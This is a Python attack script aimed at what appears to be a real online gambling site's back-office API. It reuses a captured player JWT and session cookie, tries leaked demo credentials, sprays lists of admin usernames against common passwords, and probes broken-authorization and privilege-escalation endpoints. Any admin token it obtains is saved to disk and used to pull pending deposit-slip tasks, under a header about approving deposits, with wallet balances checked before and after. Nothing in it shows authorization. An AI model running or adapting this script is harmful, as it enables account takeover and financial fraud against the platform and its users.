#!/usr/bin/env python3
"""probe_nuxt_bo_auth.py — POST /bo/authentication through Nuxt SSR proxy.

   KEY FINDING from JS bundle: axios baseURL="/" — all API calls go through
   https://manage.vak88z2.com which proxies /bo/* to bgapi with internal headers.

   We never tested POST to manage.vak88z2.com/bo/authentication!

   Also: hardcoded ThemesBrand demo creds: admin@themesbrand.com:123456
   User fetch endpoint: GET /bo/admin-v2
"""
import json, pathlib, requests, time

NUXT   = "https://manage.vak88z2.com"
TID    = "af6efb584a3d317b5a11ab6209b88e1b"
BGAPI  = f"https://{TID}bgapi.asdgapicenterssdo.com"
MGAPI  = f"https://{TID}mgapi.asdgapicenterssdo.com"
AWSALB = "vlgcaXeb8Y5xNYKM2FxLL82+YlWrbQtYzdzI4CkDyjczOBk7W/5leJij/OSavNc7HffQnEjrn0K2fJGcJQLuB8BHQVW73SdL7oLjWPM1CD+yrb05d7ZgOTSP6w+H"

JWT   = pathlib.Path("/home/kzp/claude-red/.jwt.vak88z2").read_text().strip()
HDR_P = {"Authorization": f"Bearer {JWT}", "template": "vn", "Cookie": f"AWSALB={AWSALB}"}

DOMAIN = "m.vak88z2.com"

def wallet():
    try:
        r = requests.get(f"{MGAPI}/mb/wallet", headers=HDR_P, timeout=10)
        return r.json().get("balance", "?") if r.ok else f"ERR:{r.status_code}"
    except Exception as e:
        return f"CONN_ERR:{str(e)[:60]}"

w = wallet()
print(f"wallet before: {w}")
if "CONN_ERR" in str(w):
    print("  [!] mgapi unreachable — Nuxt tests will still run")

# Nuxt SSR proxy headers — mimic real browser request
NUXT_HDR = {
    "Content-Type": "application/json",
    "Origin": "https://manage.vak88z2.com",
    "Referer": "https://manage.vak88z2.com/account/login",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Accept": "application/json, text/plain, */*",
    "X-Requested-With": "XMLHttpRequest",
}

bo_jwt = None

# ── 1. POST /bo/authentication via Nuxt proxy ──────────────────────────────────
print("\n=== POST /bo/authentication via Nuxt proxy ===")
bo_creds = [
    # ThemesBrand demo creds
    {"strategy": "local", "username": "admin@themesbrand.com", "password": "123456"},
    # Standard admin accounts
    {"strategy": "local", "username": "admin",      "password": "admin"},
    {"strategy": "local", "username": "admin",      "password": "Admin123"},
    {"strategy": "local", "username": "admin",      "password": "Admin@123"},
    {"strategy": "local", "username": "Vak88z",     "password": "admin"},
    {"strategy": "local", "username": "Vak88z",     "password": "Admin123"},
    {"strategy": "local", "username": "vak88admin", "password": "admin"},
    {"strategy": "local", "username": "vak88admin", "password": "Admin123"},
    # Email-based login
    {"strategy": "local", "email": "admin@vak88z2.com", "password": "admin"},
    {"strategy": "local", "email": "admin@vak88z2.com", "password": "Admin123"},
    # With domain
    {"strategy": "local", "username": "admin", "password": "admin", "domain": DOMAIN},
]

for cred in bo_creds:
    try:
        r = requests.post(f"{NUXT}/bo/authentication",
                          headers=NUXT_HDR, json=cred, timeout=15)
    except Exception as e:
        print(f"  CONN_ERR on Nuxt: {e}")
        break
    uname = cred.get("username", cred.get("email", "?"))
    pw    = cred.get("password", "?")
    if "html" in r.headers.get("content-type", "").lower() or r.text.strip().startswith("<!"):
        if bo_jwt is None:
            print(f"  Nuxt returns SPA HTML for /bo/authentication (not proxied)")
            bo_jwt = "spa_html"
        break
    elif r.ok and "accessToken" in r.text:
        d = r.json()
        bo_jwt = d.get("accessToken", "")
        print(f"  [!!!] {uname}:{pw} HTTP {r.status_code}: BO JWT obtained!")
        pathlib.Path("/home/kzp/claude-red/.jwt.bo_vak88z2").write_text(bo_jwt)
        break
    elif r.status_code not in (401,):
        print(f"  {uname}:{pw}: HTTP {r.status_code}: {r.text[:200]}")
    else:
        if "Internal" not in r.text:
            print(f"  {uname}:{pw}: 401 clean: {r.text[:100]}")

# ── 2. Test if Nuxt proxies /bo/* at all ─────────────────────────────────────
print("\n=== Does Nuxt proxy /bo/* endpoints? ===")
test_endpoints = [
    ("GET", "/bo/info/admin"),   # BOLA endpoint (works on bgapi)
    ("GET", "/bo/info/provider"),
    ("GET", "/bo/admin-v2"),     # User fetch endpoint
    ("POST", "/bo/authentication"),
]
for method, path in test_endpoints:
    try:
        r = requests.request(method, f"{NUXT}{path}",
                             headers={**NUXT_HDR, "Authorization": f"Bearer {JWT}"},
                             json={"strategy": "local", "username": "admin", "password": "admin"},
                             timeout=10)
        ctype = r.headers.get("content-type", "")
        is_html = "html" in ctype or r.text.strip().startswith("<!")
        print(f"  [{method}] {path}: HTTP {r.status_code} {'(HTML-SPA)' if is_html else f'JSON: {r.text[:150]}'}")
    except Exception as e:
        print(f"  [{method}] {path}: CONN_ERR {e}")

# ── 3. Try full password spray via Nuxt proxy (if it proxies) ────────────────
if bo_jwt and bo_jwt != "spa_html":
    print("\n[!!!] BO auth works — skipping spray")
else:
    print("\n=== Full BO spray via bgapi (direct) ===")
    PASSWORDS = [
        "admin", "Admin123", "Admin@123", "admin@123", "Aa112233",
        "Vak88z!", "vak88", "123456", "1234567890", "Vak88Admin",
        "Vak88Admin!", "Pwned2026!", "checksystem", "Autodaily",
    ]
    USERNAMES = ["Vak88z", "vak88admin", "admin", "Autodaily", "checksystem",
                 "Zfinance00-01", "Zfinance07", "support00-01"]
    for uname in USERNAMES:
        for pw in PASSWORDS:
            r = requests.post(f"{BGAPI}/bo/authentication",
                              headers={"Content-Type": "application/json",
                                       "Origin": "https://manage.vak88z2.com",
                                       "Cookie": f"AWSALB={AWSALB}"},
                              json={"strategy": "local", "username": uname,
                                    "password": pw, "domain": DOMAIN},
                              timeout=10)
            if r.status_code not in (401,):
                print(f"  [!!!] {uname}:{pw} HTTP {r.status_code}: {r.text[:300]}")
                if r.ok and "accessToken" in r.text:
                    bo_jwt = r.json().get("accessToken", "")
                    pathlib.Path("/home/kzp/claude-red/.jwt.bo_vak88z2").write_text(bo_jwt)
                    print(f"  [!!!] BO JWT saved!")
                    break
            elif "Incorrect" in r.text or "not found" in r.text.lower():
                print(f"  NOTE {uname}:{pw}: wrong creds (clean 401)")
        if bo_jwt and bo_jwt != "spa_html":
            break

# ── 4. GET /bo/admin-v2 with player JWT (privilege escalation check) ──────────
print("\n=== GET /bo/admin-v2 with player JWT ===")
for base, label in [(BGAPI, "bgapi"), (NUXT, "nuxt")]:
    r = requests.get(f"{base}/bo/admin-v2",
                     headers={**NUXT_HDR, "Authorization": f"Bearer {JWT}",
                              "template": "vn", "Cookie": f"AWSALB={AWSALB}"},
                     timeout=10)
    is_html = "html" in r.headers.get("content-type","") or r.text.strip().startswith("<!")
    print(f"  [{label}] HTTP {r.status_code}: {'HTML-SPA' if is_html else r.text[:200]}")

# ── 5. If BO JWT obtained, approve pending deposits ───────────────────────────
if bo_jwt and bo_jwt != "spa_html" and len(bo_jwt) > 20:
    print(f"\n=== BO JWT active — fetching slip tasks ===")
    bo_hdrs = {"Authorization": f"Bearer {bo_jwt}", "template": "vn",
               "Content-Type": "application/json", "Cookie": f"AWSALB={AWSALB}",
               "Origin": "https://manage.vak88z2.com"}
    for base, label in [(BGAPI, "bgapi"), (NUXT, "nuxt")]:
        r = requests.get(f"{base}/bo/slip-deposit-assign-task?domain={DOMAIN}&skip=0&limit=20",
                         headers=bo_hdrs, timeout=12)
        is_html = "html" in r.headers.get("content-type","") or r.text.strip().startswith("<!")
        print(f"  [{label}] slip tasks: HTTP {r.status_code}: {'HTML' if is_html else r.text[:400]}")

print(f"\nwallet final: {wallet()}")
print("=== DONE ===")
